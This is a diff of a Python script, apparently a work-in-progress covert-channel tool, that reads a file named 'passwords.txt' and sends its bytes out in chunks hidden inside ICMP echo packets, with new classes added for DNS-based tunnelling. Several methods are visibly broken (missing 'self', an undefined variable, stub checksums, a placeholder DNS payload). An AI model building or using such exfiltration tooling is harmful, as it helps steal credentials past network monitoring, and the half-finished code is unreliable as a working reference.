@@ -10,22 +10,64 @@ currentFilePath = "passwords.txt"
 ICMP_ECHO_REQUEST = 8
 ICMP_ECHO_REPLY = 0
 
-ICMP_CODE = socket.getprotobyname('icmp')
+DNS_REQUEST = 0
 
+ICMP_CODE = socket.getprotobyname('icmp')
+UDP_CODE = socket.getprotobyname('udp')
+
+class ICMPPacket:
+    def __init__(self):
+        self.type = 8#type
+        self.code = 0#code
+
+    def computeChecksum():
+        #Hey
+        return
+    def getHeader(self, id):
+        # Type (8), code(8), checksum(16), id(16), sequence(16)
+        return struct.pack("bbHHh", self.type, self.code, 0, id, 0)
+
+    def fill():
+        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
+        return
+    
+class DNSPacket:
+    def __init__(id, code):
+        self.type = type
+        self.code = code
+        self.QR = 0
+
+    def computeChecksum():
+        return
+        
+    def getHeader(id):
+        # ID (16), QR(1), OpCode(4), AA(1), TC(1), RD(1), RA(1), Z(1), RCode(16), QDCount(16), ANCount(16), NSCount(16), ARCount(16)
+        # flags = self.QR << 15
+        # All flags are 0 so we can just use an unsigned short (16 bytes) of 0
+        return struct.pack("HHHHHH", id, 0, 1, 0, 0, 0)
+
+    def fill():
+        # Data will be stored in ICMP and DNS packets differently, so use fill methods specific to packet type
+        return
+    
 def init():
     global exfilBytes
     startByte = 0
     exfilBytes = readFile("passwords.txt", "rb")
     
-def createPacket(id):
-    t = ICMP_ECHO_REQUEST # This is the type of ICMP packet
-    c = 0 # This is the code, or sub type, for the ICMP packet
-    checkSum = 0
-    # Type (8), code(8), checksum(16), id(16), sequence(16)
-    icmpHeader = struct.pack("bbHHh", t, c, checkSum, id, 0)
+def createICMPPacket(id):
+    icmpPacket = ICMPPacket()
+    icmpHeader = icmpPacket.getHeader(1)
     data = getNextChunk(startByte, chunkLength)
     
     return icmpHeader + data
+
+def createDNSPacket(id):
+    dnsPacket = DNSPacket(0, 0)
+    dnsHeader = dnsPacket.getHeader(1)
+    data = stringToBin("hello")
+    
+    return dnsHeader + data
 
 def getNextChunk(sb, cl):
     global startByte
@@ -86,7 +128,8 @@ def do_one(dest_addr, timeout=1):
     # Maximum for an unsigned short int c object counts to 65535 so
     # we have to sure that our packet id is not greater than that.
     packet_id = int((id(timeout) * random.random()) % 65535)
-    packet = createPacket(packet_id)
+    #packet = createPacket(packet_id)
+    packet = createICMPPacket(0)
     while packet:
         # The icmp protocol does not use a port, but the function
         # below expects it, so we just give it a dummy port.
